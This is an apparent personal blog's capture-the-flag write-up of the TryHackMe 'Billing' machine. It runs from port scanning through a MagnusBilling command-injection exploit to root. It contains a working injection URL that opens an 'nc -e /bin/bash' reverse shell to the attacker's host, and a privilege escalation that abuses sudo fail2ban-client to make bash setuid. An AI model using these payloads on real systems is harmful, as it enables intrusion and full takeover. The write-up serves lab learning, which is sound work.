<!DOCTYPE html>
<html lang="en">
    <head>
        <meta charset="UTF-8" />
        <meta name="viewport" content="width=device-width, initial-scale=1.0" />
        <link rel="stylesheet" href="/assets/css/style.css" />
        <link rel="stylesheet" href="/assets/css/writeups/style.css" />
        <title>Billing - pwnerguy's shell stuff</title>
        <!-- <link rel="icon" type="image/png" href="/favicons/favicon-96x96.png" sizes="96x96" />
        <link rel="icon" type="image/svg+xml" href="/favicons/favicon.svg" /> -->
        <link rel="shortcut icon" href="/assets/favicons/favicon.ico" />
        <!-- <link rel="apple-touch-icon" sizes="180x180" href="/favicons/apple-touch-icon.png" />
        <link rel="manifest" href="/favicons/site.webmanifest" /> -->
        <meta name="apple-mobile-web-app-title" content="pwnerguy's shell stuff" />
        <!-- SEO -->
        <meta name="description" content="pwnerguy's shell stuff is an offensive cybersecurity blog focused on solving practical labs from the Hack The Box, TryHackMe and VulnHub platforms." />
        <meta name="keywords" content="pwnerguy, Rubén Martos, ethical hacking, ethical hacker, penetration testing, pentesting, offensive cybersecurity, cybersecurity, Hack The Box, TryHackMe, VulnHub, SysAdmin, Linux, Windows, writeups, projects, portfolio, pwnerguy.github.io" />
        <meta name="author" content="pwnerguy" />
        <meta name="robots" content="index, follow" />
    </head>
    <body>
        <header>
            <a href="/" class="logo">pwnerguy's shell stuff</a>
            <nav>
                <a href="/writeups">Writeups</a>
                <a href="/cheatsheets">Cheat Sheets</a>
            </nav>
        </header>
        <main>
            
        <a href="/writeups" class="back-link">← Go back</a>
        <section class="writeup-content">
            <h1>Billing</h1>
<div class="writeup-tags"><span class="tag tag-tryhackme">TryHackMe</span> <span class="tag tag-easy">Easy</span> <span class="tag tag-linux">Linux</span> <span class="tag tag-lfi">LFI</span> <span class="tag tag-rce">RCE</span> <span class="tag tag-sudo">Sudo</span> <span class="tag tag-suid">SUID</span></div>
<hr>
<h2>Introduction</h2>
<p>This writeup documents the penetration testing of the <a href="https://tryhackme.com/room/billing"><strong>Billing</strong></a> machine from the <a href="https://tryhackme.com/"><strong>TryHackMe</strong></a> platform. In this case I&#39;ll exploit a vulnerable site with a LFI used as RCE to gain a reverse shell and privesc abusing a sudo binary. Note from the description: Bruteforcing is out of scope for this room.</p>
<hr>
<h2>Information Gathering</h2>
<p>After identifying the target&#39;s IP address, we need to enumerate as  much information as possible about the host. A quick way to get a hint of the OS is checking the TTL value from a simple ping to a host on our local network. <a href="https://github.com/pwnerguy/ttl-ripper"><strong>ttl-ripper.sh</strong></a> can also be used for this purpose.</p>
<ul>
<li>TTL 64: Linux.</li>
<li>TTL 128: Windows.</li>
</ul>
<pre><code>❯ ping -c 1 10.81.159.65
PING 10.81.159.65 (10.81.159.65) 56(84) bytes of data.
64 bytes from 10.81.159.65: icmp_seq=1 ttl=62 time=54.7 ms

--- 10.81.159.65 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 54.724/54.724/54.724/0.000 ms
</code></pre>
<p>In this case, it seems to be a Linux machine. Let&#39;s perform some scans.</p>
<pre><code>❯ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.81.159.65 -oG allPorts
Host discovery disabled (-Pn). All addresses will be marked &#39;up&#39; and scan times may be slower.
Starting Nmap 7.95 ( https://nmap.org ) at 2026-01-07 16:03 CET
Initiating SYN Stealth Scan at 16:03
Scanning 10.81.159.65 [65535 ports]
Discovered open port 22/tcp on 10.81.159.65
Discovered open port 3306/tcp on 10.81.159.65
Discovered open port 80/tcp on 10.81.159.65
Discovered open port 5038/tcp on 10.81.159.65
Completed SYN Stealth Scan at 16:03, 20.95s elapsed (65535 total ports)
Nmap scan report for 10.81.159.65
Host is up, received user-set (0.099s latency).
Scanned at 2026-01-07 16:03:32 CET for 21s
Not shown: 62849 closed tcp ports (reset), 2682 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE REASON
22/tcp   open  ssh     syn-ack ttl 62
80/tcp   open  http    syn-ack ttl 62
3306/tcp open  mysql   syn-ack ttl 62
5038/tcp open  unknown syn-ack ttl 62

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 21.06 seconds
           Raw packets sent: 103000 (4.532MB) | Rcvd: 66159 (3.305MB)
</code></pre>
<pre><code>❯ nmap -sCV -p22,80,3306,5038 10.81.159.65 -oN targeted
Starting Nmap 7.95 ( https://nmap.org ) at 2026-01-07 16:04 CET
Nmap scan report for 10.81.159.65
Host is up (0.055s latency).

PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 9.2p1 Debian 2+deb12u6 (protocol 2.0)
| ssh-hostkey: 
|   256 91:46:50:92:ab:be:6c:18:1e:fb:81:0e:a0:f2:78:5d (ECDSA)
|_  256 ee:80:12:09:fa:2d:3a:3b:65:e0:22:9f:81:32:3b:86 (ED25519)
80/tcp   open  http     Apache httpd 2.4.62 ((Debian))
| http-title:             MagnusBilling        
|_Requested resource was http://10.81.159.65/mbilling/
|_http-server-header: Apache/2.4.62 (Debian)
| http-robots.txt: 1 disallowed entry 
|_/mbilling/
3306/tcp open  mysql    MariaDB 10.3.23 or earlier (unauthorized)
5038/tcp open  asterisk Asterisk Call Manager 2.10.6
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.91 seconds
</code></pre>
<p>Nmap found some open ports. The intrusion is probably going to be, or at least start, from port 80. You can Google the Apache or SSH version followed by “launchpad” to get a good hint about the OS. You can also check the blog’s <a href="https://pwnerguy.github.io/enumeration-cheatsheet/">Enumeration Cheat Sheet</a>, which includes a table mapping service versions to possible operating system versions. We are facing an <strong>Debian Bookworm</strong>.</p>
<p>We can&#39;t do much with the SSH service since we don&#39;t have credentials yet. Now it&#39;s time to enumerate the web server running on the port 80.</p>
<p>We see in nmap&#39;s output a disallowed entry for <code>robots.txt</code>.</p>
<pre><code>❯ whatweb http://10.81.159.65
http://10.81.159.65 [302 Found] Apache[2.4.62], Country[RESERVED][ZZ], HTTPServer[Debian Linux][Apache/2.4.62 (Debian)], IP[10.81.159.65], RedirectLocation[./mbilling]
</code></pre>
<pre><code>❯ whatweb http://10.81.159.65/mbilling/
http://10.81.159.65/mbilling/ [200 OK] Apache[2.4.62], Country[RESERVED][ZZ], HTML5[applicationCache], HTTPServer[Debian Linux][Apache/2.4.62 (Debian)], IP[10.81.159.65], Script[text/javaScript,text/javascript], Title[MagnusBilling][Title element contains newline(s)!]
</code></pre>
<p><img src="/assets/images/billing/web.png" alt=""></p>
<p>Nothing interesting in the source code. The <code>Forgot your password?</code> link requests an email address. Besides, I can confirm that bruteforcing is not the point of this machine.</p>
<p><img src="/assets/images/billing/ban.png" alt=""></p>
<p>Let&#39;s fuzz some directories in the root directory of the web and <code>/mbilling</code> and see what&#39;s inside of them.</p>
<pre><code>❯ gobuster dir -u http://10.81.159.65 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 20
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.81.159.65
[+] Method:                  GET
[+] Threads:                 20
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/server-status        (Status: 403) [Size: 277]
Progress: 220557 / 220557 (100.00%)
===============================================================
Finished
===============================================================
</code></pre>
<pre><code>❯ gobuster dir -u http://10.81.159.65/mbilling -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 20
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.81.159.65/mbilling
[+] Method:                  GET
[+] Threads:                 20
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/archive              (Status: 301) [Size: 323] [--&gt; http://10.81.159.65/mbilling/archive/]
/resources            (Status: 301) [Size: 325] [--&gt; http://10.81.159.65/mbilling/resources/]
/assets               (Status: 301) [Size: 322] [--&gt; http://10.81.159.65/mbilling/assets/]
/lib                  (Status: 301) [Size: 319] [--&gt; http://10.81.159.65/mbilling/lib/]
/tmp                  (Status: 301) [Size: 319] [--&gt; http://10.81.159.65/mbilling/tmp/]
/LICENSE              (Status: 200) [Size: 7652]
/protected            (Status: 403) [Size: 277]
Progress: 220557 / 220557 (100.00%)
===============================================================
Finished
===============================================================
</code></pre>
<p><code>/mbilling/lib</code> is the libraries directory where there are a bunch of PHP files, some JSON files and certificates used by a billing software called <strong>MagnusBilling</strong>.</p>
<blockquote>
<p><strong>MagnusBilling</strong> a powerful, <strong>open-source VoIP</strong> (Voice over IP) billing and softswitch system used by telecom providers to manage SIP trunks, call routing, user accounts...</p>
</blockquote>
<p><img src="/assets/images/billing/lib_dir.png" alt=""></p>
<p>As nmap showed, the MySQL service running MariaDB on the port 3306/tcp is active but can&#39;t log into it.  It seems that the service is denying our connection request because my IP isn&#39;t allowed. There aren&#39;t much more things to enumerate about this service.</p>
<pre><code>❯ nc 10.81.159.65 3306 
Host &#39;ip-192-168-135-33.eu-west-1.compute.internal&#39; is not allowed to connect to this MariaDB server
❯ mysql -u root -h 10.81.159.65 -p 
Enter password: ERROR 2002 (HY000): Received error packet before completion of TLS handshake. The authenticity of the following error cannot be verified: 1130 - Host &#39;ip-192-168-135-33.eu-west-1.compute.internal&#39; is not allowed to connect to this MariaDB server
</code></pre>
<p>Finally, nmap showed <code>Asterisk Call Manager 2.10.6</code>.</p>
<blockquote>
<p>The Asterisk Call Manager, more formally known as the <strong>Asterisk Manager Interface (AMI)</strong>, is a powerful TCP/IP-based API that lets external applications connect to an Asterisk PBX (Private Branch Exchange) system to monitor events, issue commands (like originating calls or checking queue status), and control telephony functions in real-time, acting like a remote control for the Asterisk server.</p>
</blockquote>
<hr>
<h2>Vulnerability Assessment</h2>
<pre><code>❯ searchsploit magnus
---------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                    |  Path
---------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
MagnusSolution magnusbilling 7.3.0 - Command Injection                                                                            | multiple/webapps/52170.txt
---------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
</code></pre>
<pre><code># Exploit Title: MagnusSolution magnusbilling 7.3.0 - Command Injection
# Date: 2024-10-26
# Exploit Author: CodeSecLab
# Vendor Homepage: https://github.com/magnussolution/magnusbilling7
# Software Link: https://github.com/magnussolution/magnusbilling7
# Version: 7.3.0
# Tested on: Centos
# CVE : CVE-2023-30258


# PoC URL for Command Injection

http://magnusbilling/lib/icepay/icepay.php?democ=testfile; id &gt; /tmp/injected.txt

Result: This PoC attempts to inject the id command.

[Replace Your Domain Name]
</code></pre>
<hr>
<h2>Exploitation</h2>
<p>We can exploit this vuln both manually and using Metasploit. The vuln consist of a PHP file parameter <code>icepay.php?democ=randomString</code> that can be finished with <code>;</code>, giving us the opportunity to execute any command in the system after it. Let&#39;s try to get a reverse shell.</p>
<pre><code>http://10.81.159.65/mbilling/lib/icepay/icepay.php?democ=testfile;%20nc%20-e%20/bin/bash%20192.168.135.33%20444
</code></pre>
<p><img src="/assets/images/billing/pwned.png" alt=""></p>
<hr>
<h2>Post-Exploitation</h2>
<p>TTY updrading:</p>
<pre><code>❯ script /dev/null -c bash
❯ Ctrl+Z
❯ stty raw -echo; fg
❯ reset xterm
❯ export TERM=xterm
❯ export SHELL=bash
❯ stty rows 44 columns 185
</code></pre>
<p>I&#39;m asterisk which is the user with web server privileges. The first flag it&#39;s <code>user.txt</code>, so it might be in <code>/home</code>.</p>
<pre><code>asterisk@ip-10-81-159-65:/home/magnus$ cat user.txt
***REDACTED***
</code></pre>
<pre><code>asterisk@ip-10-81-159-65:/home/magnus$ sudo -l
Matching Defaults entries for asterisk on ip-10-81-159-65:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

Runas and Command-specific defaults for asterisk:
    Defaults!/usr/bin/fail2ban-client !requiretty

User asterisk may run the following commands on ip-10-81-159-65:
    (ALL) NOPASSWD: /usr/bin/fail2ban-client
</code></pre>
<p>I noticed that <code>asterisk</code> can run the binary <code>/usr/bin/fail2ban-client</code> as root, since root is running the process.</p>
<pre><code>asterisk@ip-10-81-159-65:/$ ps -aux | grep fail2ban
root        4572  0.0  0.7 177564 15440 ?        Sl   06:35   0:00 /usr/bin/python3 /usr/bin/fail2ban-server
</code></pre>
<blockquote>
<p><strong>Fail2Ban</strong> is an <strong>security tool that monitors log files</strong> for malicious activity, like repeated failed login attempts, and automatically banning the offending IPs using firewalls rules. </p>
</blockquote>
<blockquote>
<p>A <strong>jail</strong> is a configuration that define which logs to monitor, patterns to look for and the actions to perform when a pattern is matched. A jail example from /etc/fail2ban/jail.local would be:</p>
</blockquote>
<pre><code>[asterisk-iptables]
enabled  = true
filter   = asterisk
action   = iptables-allports[name=ASTERISK, port=all, protocol=all]
logpath  = /var/log/asterisk/messages
maxretry = 5
bantime = 600
</code></pre>
<p>The jail <code>asterisk-iptables</code> monitors the log file <code>/var/log/asterisk/messages</code> and checks for patterns defined the <code>asterisk</code> filter  (<code>/etc/fail2ban/filter.d/asterisk.conf</code>). When those patterns are matched, it performs the action defined in the <code>iptables-allports</code> action (<code>/etc/fail2ban/action.d/iptables-allports.conf</code>). As a result, we can modify the <strong>action to perform</strong> when banning an IP.</p>
<p>Firstly, we clean all actions for this jail.</p>
<pre><code>asterisk@ip-10-81-159-65:/$ sudo /usr/bin/fail2ban-client get asterisk-iptables actions
The jail asterisk-iptables has the following actions:
iptables-allports-ASTERISK
</code></pre>
<p>Secondly, we modify the command to execute for <code>actionban</code> defined in the <code>iptables-allports-ASTERISK</code> action.</p>
<pre><code>asterisk@ip-10-81-159-65:/$ sudo /usr/bin/fail2ban-client set asterisk-iptables action iptables-allports-ASTERISK actionban &#39;chmod +s /bin/bash&#39;
asterisk@ip-10-81-159-65:/$ sudo /usr/bin/fail2ban-client get asterisk-iptables action iptables-allports-ASTERISK actionban 
</code></pre>
<p>The final step is banning an IP for the <code>asterisk-iptables</code> jail, which will execute the command for <code>actionban</code> defined in the <code>iptables-allports-ASTERISK</code> action.</p>
<pre><code>asterisk@ip-10-81-159-65:/$ sudo /usr/bin/fail2ban-client set asterisk-iptables banip 1.1.1.1
asterisk@ip-10-81-159-65:/$ ls -l /bin/bash
-rwsr-sr-x 1 root root 1265648 Apr 18  2025 /bin/bash
</code></pre>
<pre><code>asterisk@ip-10-81-159-65:/$ bash -p
bash-5.2# cat /root/root.txt
***REDACTED***
</code></pre>

        </section>
    
        </main>
        <footer>
            <p>© 2026 <strong>pwnerguy's shell stuff</strong></p>
            <div class="icons">
                <a href="mailto:rmp.it@proton.me" target="_blank"">
                    <svg class="svg-inline--fa fa-envelope-square fa-w-14 fa-fw" aria-hidden="true" focusable="false" data-prefix="fas" data-icon="envelope-square" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512" data-fa-i2svg=""><path fill="currentColor" d="M400 32H48C21.49 32 0 53.49 0 80v352c0 26.51 21.49 48 48 48h352c26.51 0 48-21.49 48-48V80c0-26.51-21.49-48-48-48zM178.117 262.104C87.429 196.287 88.353 196.121 64 177.167V152c0-13.255 10.745-24 24-24h272c13.255 0 24 10.745 24 24v25.167c-24.371 18.969-23.434 19.124-114.117 84.938-10.5 7.655-31.392 26.12-45.883 25.894-14.503.218-35.367-18.227-45.883-25.895zM384 217.775V360c0 13.255-10.745 24-24 24H88c-13.255 0-24-10.745-24-24V217.775c13.958 10.794 33.329 25.236 95.303 70.214 14.162 10.341 37.975 32.145 64.694 32.01 26.887.134 51.037-22.041 64.72-32.025 61.958-44.965 81.325-59.406 95.283-70.199z"></path></svg>
                </a>
                <a href="https://www.linkedin.com/in/r-mar" target="_blank">
                    <svg class="svg-inline--fa fa-linkedin fa-w-14 fa-fw" aria-hidden="true" focusable="false" data-prefix="fab" data-icon="linkedin" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512" data-fa-i2svg=""><path fill="currentColor" d="M416 32H31.9C14.3 32 0 46.5 0 64.3v383.4C0 465.5 14.3 480 31.9 480H416c17.6 0 32-14.5 32-32.3V64.3c0-17.8-14.4-32.3-32-32.3zM135.4 416H69V202.2h66.5V416zm-33.2-243c-21.3 0-38.5-17.3-38.5-38.5S80.9 96 102.2 96c21.2 0 38.5 17.3 38.5 38.5 0 21.3-17.2 38.5-38.5 38.5zm282.1 243h-66.4V312c0-24.8-.5-56.7-34.5-56.7-34.6 0-39.9 27-39.9 54.9V416h-66.4V202.2h63.7v29.2h.9c8.9-16.8 30.6-34.5 62.9-34.5 67.2 0 79.7 44.3 79.7 101.9V416z"></path></svg>
                </a>
                <a href="https://github.com/pwnerguy" target="_blank">
                    <svg class="svg-inline--fa fa-github fa-w-16 fa-fw" aria-hidden="true" focusable="false" data-prefix="fab" data-icon="github" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512" data-fa-i2svg=""><path fill="currentColor" d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6zm-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3zm44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9zM244.8 8C106.1 8 0 113.3 0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8zM97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1zm-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7zm32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1zm-11.4-14.7c-1.6 1-1.6 3.6 0 5.9 1.6 2.3 4.3 3.3 5.6 2.3 1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2z"></path></svg>
                </a>
                <a href="https://tryhackme.com/p/pwnerguy" target="_blank">
                    <svg class="svg-inline--fa fa-user-secret fa-w-14" aria-hidden="true" focusable="false" data-prefix="fas" data-icon="user-secret" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512" data-fa-i2svg=""><path fill="currentColor" d="M383.9 308.3l23.9-62.6c4-10.5-3.7-21.7-15-21.7h-58.5c11-18.9 17.8-40.6 17.8-64v-.3c39.2-7.8 64-19.1 64-31.7 0-13.3-27.3-25.1-70.1-33-9.2-32.8-27-65.8-40.6-82.8-9.5-11.9-25.9-15.6-39.5-8.8l-27.6 13.8c-9 4.5-19.6 4.5-28.6 0L182.1 3.4c-13.6-6.8-30-3.1-39.5 8.8-13.5 17-31.4 50-40.6 82.8-42.7 7.9-70 19.7-70 33 0 12.6 24.8 23.9 64 31.7v.3c0 23.4 6.8 45.1 17.8 64H56.3c-11.5 0-19.2 11.7-14.7 22.3l25.8 60.2C27.3 329.8 0 372.7 0 422.4v44.8C0 491.9 20.1 512 44.8 512h358.4c24.7 0 44.8-20.1 44.8-44.8v-44.8c0-48.4-25.8-90.4-64.1-114.1zM176 480l-41.6-192 49.6 32 24 40-32 120zm96 0l-32-120 24-40 49.6-32L272 480zm41.7-298.5c-3.9 11.9-7 24.6-16.5 33.4-10.1 9.3-48 22.4-64-25-2.8-8.4-15.4-8.4-18.3 0-17 50.2-56 32.4-64 25-9.5-8.8-12.7-21.5-16.5-33.4-.8-2.5-6.3-5.7-6.3-5.8v-10.8c28.3 3.6 61 5.8 96 5.8s67.7-2.1 96-5.8v10.8c-.1.1-5.6 3.2-6.4 5.8z"></path></svg>
                </a>
                <a href="https://app.hackthebox.com/users/3026377" target="_blank" rel="noopener">
                    <svg class="svg-inline--fa fa fa-cube" aria-hidden="true" focusable="false" data-prefix="fas" data-icon="fa-cube" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512" data-fa-i2svg=""><path fill="currentColor" d="M239.1 6.3l-208 78c-18.7 7-31.1 25-31.1 45v225.1c0 18.2 10.3 34.8 26.5 42.9l208 104c13.5 6.8 29.4 6.8 42.9 0l208-104c16.3-8.1 26.5-24.8 26.5-42.9V129.3c0-20-12.4-37.9-31.1-44.9l-208-78C262 2.2 250 2.2 239.1 6.3zM256 68.4l192 72v1.1l-192 78-192-78v-1.1l192-72zm32 356V275.5l160-65v133.9l-160 80z"></path></svg>
                </a>
            </div>
        </footer>
        <script>
            // document.addEventListener("DOMContentLoaded", () => {
            //     const cards = document.querySelectorAll('.writeup-card');
            //     const searchInput = document.getElementById('searchInput');
            //     if (!searchInput) return;
            //     searchInput.addEventListener('input', () => {
            //         const q = searchInput.value.toLowerCase();
            //         cards.forEach(card => {
            //             const categories = (card.dataset.categories || "").toLowerCase();
            //             const title = card.querySelector("h2").textContent.toLowerCase();
            //             const haystack = `${categories} ${title}`;
            //             if (haystack.includes(q)) {
            //                 card.classList.remove("hidden");
            //             } else {
            //                 card.classList.add("hidden");
            //             }
            //         });
            //     });
            // });

            document.addEventListener("DOMContentLoaded", () => {
            document.querySelectorAll('a[href^="http"]').forEach(a => {
                a.setAttribute("target", "_blank");
                a.setAttribute("rel", "noopener noreferrer");
            });
            });

            // document.addEventListener("DOMContentLoaded", () => {
            //     const cards = document.querySelectorAll('.writeup-card');
            //     const searchInput = document.getElementById('searchInput');
            //     if (!searchInput) return;
            //     searchInput.addEventListener('input', () => {
            //         const terms = searchInput.value
            //             .toLowerCase()
            //             .trim()
            //             .split(/\s+/);
            //         cards.forEach(card => {
            //             const categories = (card.dataset.categories || "").toLowerCase();
            //             const title = card.querySelector("h2").textContent.toLowerCase();
            //             const haystack = `${categories} ${title}`.replace(/\s+/g, " ");
            //             const matches = terms.every(t => haystack.includes(t));
            //             card.classList.toggle("hidden", !matches);
            //         });
            //     });
            // });

            document.addEventListener("DOMContentLoaded", () => {
                const cards = document.querySelectorAll('.writeup-card');
                const searchInput = document.getElementById('searchInput');
                const resultsCount = document.getElementById('resultsCount');

                function updateCount() {
                    const visible = document.querySelectorAll(".writeup-card:not(.hidden)").length;
                    if (resultsCount) {
                        resultsCount.textContent = `${visible} available machines`;
                    }
                }

                if (!searchInput) return;

                searchInput.addEventListener('input', () => {
                    const terms = searchInput.value
                        .toLowerCase()
                        .trim()
                        .split(/\s+/);

                    cards.forEach(card => {
                        const categories = (card.dataset.categories || "").toLowerCase();
                        const title = card.querySelector("h2").textContent.toLowerCase();
                        const haystack = `${categories} ${title}`.replace(/\s+/g, " ");

                        const matches = terms.every(t => haystack.includes(t));
                        card.classList.toggle("hidden", !matches);
                    });

                    updateCount();
                });

                updateCount();
            });

        </script>
    </body>
</html>